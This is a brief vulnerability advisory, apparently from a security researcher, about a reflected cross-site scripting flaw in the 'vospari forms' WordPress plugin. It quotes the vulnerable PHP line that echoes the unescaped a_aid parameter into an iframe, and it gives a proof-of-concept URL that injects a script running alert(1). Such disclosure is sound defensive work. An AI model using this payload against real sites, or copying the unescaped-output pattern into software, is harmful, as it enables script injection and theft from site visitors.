Reflected XSS in vospari forms plugin 
-------------------------------

*About*

> The plugin is designed to generate forms of registration and authorization, which transmit data TradeSmarter trading platform. Forms are generated by a simple shortcode.

*Details*: [Wordpress Plugin Page](https://wordpress.org/plugins/vospari-forms/)

*Timeline*

* 2016-07-31: Vendor Notified

*Vulnerability*: The `a_aid` parameter on a page that has a form allows for reflected XSS 

    412: echo '<iframe src="'.$protocol.'://trading.vospari.com/ru?a_aid='.$_GET['a_aid'].'" style="display:none;" width="0" height="0"></iframe>'; 
*Proof of Concept*: Altering the url would allow for the XSS to be executed

`http://wordpress.site/?page_id=2&a_aid="></iframe><script+src%3Ddata%3A%26comma%3Balert(1)%2F%2F`

would execute `alert(1)` but could be used to run something more malicious
